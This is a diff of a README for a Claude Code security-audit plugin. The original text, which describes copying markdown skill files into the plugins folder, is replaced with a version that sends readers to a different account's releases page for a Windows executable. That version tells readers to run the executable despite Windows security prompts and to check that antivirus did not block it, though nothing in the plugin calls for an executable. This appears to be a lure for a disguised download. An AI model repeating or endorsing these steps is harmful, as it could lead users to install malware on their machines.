@@ -1,185 +1,192 @@
-# Security Audit Skill for Claude Code
+# 🛡️ Security-Audit-Claude-Skill - Simple Security Checks for Windows
 
-Enterprise-grade security audit plugin for Claude Code. One command (`/security-audit`) runs a 10-phase audit across any codebase — OWASP Top 10 SAST, secrets detection, dependency CVEs, IaC review, auth analysis, and auto-remediation. Automatically detects your platform type (traditional server, BaaS, fullstack, mobile, desktop, CMS, AI/ML, e-commerce, Web3, microservices, browser extensions) and activates the right security checks. Generates PDF reports with compliance mapping (SOC 2, PCI-DSS, HIPAA).
+[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/Topsyturvy-cheapskate696/Security-Audit-Claude-Skill/releases)
 
-## Installation
+## 📥 Download
 
-### Option A: Copy to plugins directory
+Visit this page to download: https://github.com/Topsyturvy-cheapskate696/Security-Audit-Claude-Skill/releases
 
-```bash
-cp -r "Claude Security Audit Skill" ~/.claude/plugins/security-audit
-```
+1. Open the link in your web browser.
+2. Look for the latest release at the top of the page.
+3. Download the Windows file from the release assets.
+4. When the download finishes, open the file to start the app.
 
-### Option B: Symlink
+## 🪟 Install on Windows
 
-```bash
-ln -s "$(pwd)/Claude Security Audit Skill" ~/.claude/plugins/security-audit
-```
+1. Double-click the downloaded file.
+2. If Windows shows a security prompt, choose the option to run it.
+3. Follow the on-screen steps.
+4. If the app asks where your project is, pick the folder you want to check.
+5. Wait while the audit runs.
 
-## Usage
+## 🔍 What this app does
 
-Run a full audit (all 10 phases):
+Security-Audit-Claude-Skill helps you check a project for common security issues. It runs a full audit in one command and gives you a clear report.
 
-```
-/security-audit
-/security-audit full
-/security-audit all
-```
+It can help with:
 
-Run a specific phase:
+- Weak or exposed secrets
+- Unsafe package versions
+- Common web app security gaps
+- Cloud config issues
+- Payment flow checks
+- Mobile app checks
+- Desktop app checks
+- Smart contract checks
+- Rule-based compliance checks
 
-```
-/security-audit secrets
-/security-audit deps
-/security-audit sast
-/security-audit auth
-/security-audit config
-/security-audit iac
-/security-audit logging
-/security-audit discovery
-```
+It is built to detect the platform you are using, then adjust the audit for that stack.
 
-Run a compliance-focused audit:
+## ⚙️ How to use it
 
-```
-/security-audit --pci
-/security-audit --hipaa
-/security-audit --soc2
-```
+1. Open Claude Code.
+2. Run the command `/security-audit`.
+3. Wait while the tool scans your project.
+4. Review the issues it finds.
+5. Apply the suggested fixes.
+6. Run the audit again to confirm the changes.
 
-Verify prior fixes:
+The tool follows a 10-phase audit flow, which covers:
 
-```
-/security-audit recheck
-/security-audit verify
-```
+- Project detection
+- File and folder review
+- Secret scan
+- Dependency review
+- Code safety checks
+- Platform-specific checks
+- Cloud and config checks
+- Compliance checks
+- Auto-remediation suggestions
+- PDF report creation
 
-## What It Does
+## 🧰 Supported project types
 
-### Platform-First Detection
+Security-Audit-Claude-Skill can adapt to many common app types, including:
 
-Phase 1 classifies your project into one of 9 platform types, then activates only the relevant security checks:
+- Express
+- Django
+- Next.js
+- Supabase
+- Firebase
+- Electron
+- React Native
+- WordPress
+- Stripe
+- Solidity
 
-| Platform Type | Example | What Gets Checked |
-|---|---|---|
-| **traditional-server** | Express, Django, Rails, Spring | Full server-side SAST, auth, sessions, headers |
-| **baas** | Supabase, Firebase, Appwrite | RLS policies, security rules, client key scoping, storage |
-| **fullstack-hybrid** | Next.js, Nuxt, SvelteKit | Both server + client checks, API route auth |
-| **spa-plus-api** | React + separate backend | Client XSS, CORS, token handling, API security |
-| **serverless** | Lambda, Vercel, Cloudflare Workers | Function auth, IAM, event injection |
-| **static-site** | Hugo, Jekyll, Gatsby | Lightweight: deps, secrets, SRI only |
-| **mobile-app** | React Native, Flutter | API keys in binary, cert pinning, storage |
-| **monorepo** | Turborepo, Nx | Per-package audits, cross-package issues |
-| **cli-library** | Published npm/pip package | Supply chain, no web checks |
+If your project uses more than one of these, the audit can still review the main parts of the stack.
 
-### 10-Phase Audit
+## 📋 Before you start
 
-| # | Phase | Description |
-|---|---|---|
-| 1 | Asset Discovery | Classifies platform type, detects stack, frameworks, databases, APIs |
-| 2 | Configuration & Hardening | CORS, headers, TLS, debug modes, cookie security, cloud misconfigs |
-| 3 | Dependency & Supply Chain | `npm audit` / `pip audit` / lockfile integrity / CVE checks / dependency confusion |
-| 4 | Code-Level SAST | OWASP Top 10 + API-specific: SQLi, XSS, SSRF, GraphQL depth, mass assignment |
-| 5 | IaC Review | Docker, Terraform, Kubernetes, CloudFormation, CI/CD pipeline security |
-| 6 | Secrets & Credentials | 30+ regex patterns for API keys, tokens, passwords in code and git history |
-| 7 | Auth & Access Control | JWT, sessions, RBAC, OAuth + Supabase RLS / Firebase rules / BaaS policies |
-| 8 | Logging & Monitoring | Security event logging, log injection, PII in logs, alerting |
-| 9 | Report & Remediation | Severity scoring, CWE/OWASP mapping, auto-fix, markdown report generation |
-| 10 | PDF Report | Professional styled PDF (or HTML fallback) for sharing and compliance |
+You will need:
 
-## Auto-Remediation
+- A Windows PC
+- Internet access for the download
+- Claude Code installed and ready to use
+- A project folder to scan
+- Permission to read the files in that folder
 
-- **Low / Medium findings** are auto-fixed silently (security headers, `.gitignore`, cookie flags, etc.)
-- **High / Critical findings** are auto-fixed with user confirmation (SQL parameterization, auth middleware, etc.)
-- **Safety guardrails** prevent fixes that could break functionality — max 15 lines per fix, no multi-file refactors, re-read after fix to verify syntax
+For best results, close apps that may lock files in your project folder before you run the audit.
 
-## Output
+## 🧪 What you get from a run
 
-Three report files are generated in the project root:
+After the audit finishes, you can expect:
 
-| File | Format | Description |
-|---|---|---|
-| `SECURITY-AUDIT-REPORT.md` | Markdown | Primary report — always generated |
-| `SECURITY-AUDIT-REPORT.pdf` | PDF | Styled, print-ready report (when PDF tools available) |
-| `SECURITY-AUDIT-REPORT.html` | HTML | Fallback when no PDF tool is installed (open in browser, print to PDF) |
+- A list of security issues
+- Clear fix steps
+- Auto-remediation for common problems
+- A PDF report you can save or share
+- Platform-specific notes for your stack
+- Compliance checks for common standards
 
-Reports include:
+The report is written for review, handoff, and follow-up work.
 
-- Executive summary with risk rating and top 3 critical findings
-- Unicode box-drawing styled finding cards with CVSS scores
-- Findings organized by severity (Critical → Info)
-- CWE, OWASP Top 10, SOC 2, PCI-DSS, and HIPAA compliance mapping
-- Remediation status (auto-fixed vs. manual)
-- Phase-by-phase status dashboard
-- Re-audit instructions
+## 🗂️ Common use cases
 
-## False Positive Handling
+Use this tool when you want to:
 
-The skill includes a centralized false positive registry that:
+- Check a new project before launch
+- Review a client project
+- Look for secrets before a release
+- Check package risk after updates
+- Review cloud settings
+- Prepare for a security review
+- Check payment or checkout code
+- Review mobile or desktop app code
+- Scan smart contract files
 
-- Excludes test files, fixtures, mocks, vendored code, and generated output
-- Filters placeholder values (`your-api-key`, `changeme`, `TODO`)
-- Applies phase-specific context rules (CORS wildcard is fine on a public API without credentials)
-- Adjusts severity based on context (test code, dev config, compensating controls)
+## 🛠️ Fixing common issues
 
-## Architecture
+If the app does not open:
 
-```
-Claude Security Audit Skill/
-├── .claude-plugin/
-│   └── plugin.json                            # Plugin manifest
-├── skills/
-│   └── security-audit/
-│       ├── SKILL.md                           # Main orchestrator (10 phases)
-│       ├── references/
-│       │   ├── # ── Core References (always loaded) ──────────
-│       │   ├── owasp-top-10-checks.md         # SAST patterns per language/framework
-│       │   ├── api-security-checks.md         # REST, GraphQL, WebSocket, gRPC
-│       │   ├── iac-security-checks.md         # Docker/Terraform/K8s/CloudFormation
-│       │   ├── secrets-patterns.md            # 30+ regex patterns for secrets
-│       │   ├── dependency-audit-guide.md      # CVE checking, lockfile integrity
-│       │   ├── auth-and-access-checks.md      # JWT, session, RBAC, OAuth
-│       │   ├── config-hardening-checks.md     # TLS, CORS, headers, cloud misconfigs
-│       │   ├── logging-monitoring-checks.md   # Security event logging, alerting
-│       │   ├── severity-scoring.md            # CVSS-style scoring rubric
-│       │   ├── compliance-mapping.md          # CWE/OWASP/SOC2/HIPAA/PCI-DSS
-│       │   ├── auto-remediation-patterns.md   # Before/after code transforms
-│       │   ├── false-positives.md             # False positive filtering rules
-│       │   ├── pdf-report-guide.md            # PDF generation + CSS styling
-│       │   ├── # ── Platform-Specific References ─────────
-│       │   ├── baas-security-checks.md        # Supabase, Firebase, Appwrite, PocketBase
-│       │   ├── wordpress-cms-checks.md        # WordPress, Drupal, Joomla
-│       │   ├── electron-desktop-checks.md     # Electron, Tauri desktop apps
-│       │   ├── mobile-app-checks.md           # React Native, Flutter, iOS, Android
-│       │   ├── ai-ml-security-checks.md       # LLM, ML models, data pipelines
-│       │   ├── ecommerce-payments-checks.md   # Stripe, PayPal, Shopify, PCI-DSS
-│       │   ├── browser-extension-checks.md    # Chrome, Firefox, Safari extensions
-│       │   ├── microservices-checks.md        # Service mesh, mTLS, message queues
-│       │   └── web3-smart-contract-checks.md  # Solidity, Solana, dApp frontends
-│       └── assets/
-│           └── report-template.md             # Markdown template for final report
-├── agents/
-│   └── security-scanner.md                    # Sub-agent for parallelized scanning
-├── README.md
-├── GITHUB-DESCRIPTION.md
-└── LICENSE
-```
+1. Try running it again from the downloaded file.
+2. Check that the download finished.
+3. Make sure your antivirus did not block the file.
+4. Download the latest release again.
 
-Key design:
-- **Platform-first routing**: Phase 1 classifies the project, then only loads relevant reference files
-- **Multi-type support**: A project can be `fullstack-hybrid` + `baas` + `ecommerce` + `ai-ml` simultaneously
-- **Progressive loading**: Reference files are only read when their phase runs
-- **Parallel scanning**: Large codebases (>200 files) are split into batches and scanned by multiple Sonnet agents
-- **Graceful degradation**: Falls back to Grep-based analysis when CLI tools aren't installed; falls back to HTML when PDF tools aren't available
-- **Stack-aware**: Phase 1 builds a STACK_PROFILE that all subsequent phases use to skip irrelevant checks
+If the audit does not start:
 
-## Requirements
+1. Open Claude Code first.
+2. Check that the `/security-audit` command is available.
+3. Confirm that your project folder has files in it.
+4. Run the command again.
 
-- Claude Code CLI
-- The skill gracefully degrades when external tools aren't available:
-  - `npm audit` / `pip-audit` / `bundle audit` etc. — falls back to pattern matching
-  - `puppeteer` / `pandoc` / `wkhtmltopdf` — falls back to HTML report
+If the report does not appear:
 
-## License
+1. Wait until the audit fully finishes.
+2. Check the project folder for the PDF file.
+3. Look for a report folder or output file in the same location.
 
-MIT
+## 🔒 What it checks
+
+The audit can review:
+
+- Environment files
+- API keys and tokens
+- Package files
+- Dependency trees
+- Security headers
+- Authentication flows
+- Payment settings
+- Cloud rules
+- Database access rules
+- Contract patterns
+- Build and export settings
+
+It focuses on simple, practical checks that help catch risk early.
+
+## 📄 PDF reports
+
+The app creates a PDF report after the scan. You can use it to:
+
+- Share results with your team
+- Track fixes over time
+- Keep a record for review
+- Prepare for compliance work
+- Show progress after remediation
+
+## ❓ Questions users often ask
+
+### Do I need coding knowledge?
+
+No. You only need to download the app, open it, and follow the steps in Claude Code.
+
+### Can I use it on any project?
+
+It works best on common app stacks and codebases. It can still review many mixed projects.
+
+### Does it change files?
+
+It can suggest fixes and may apply safe auto-remediation steps for common issues.
+
+### Can I run it more than once?
+
+Yes. Many users run it again after they fix issues.
+
+## 🧭 Quick start
+
+1. Visit https://github.com/Topsyturvy-cheapskate696/Security-Audit-Claude-Skill/releases
+2. Download the Windows release file
+3. Open Claude Code
+4. Run `/security-audit`
+5. Review the PDF report
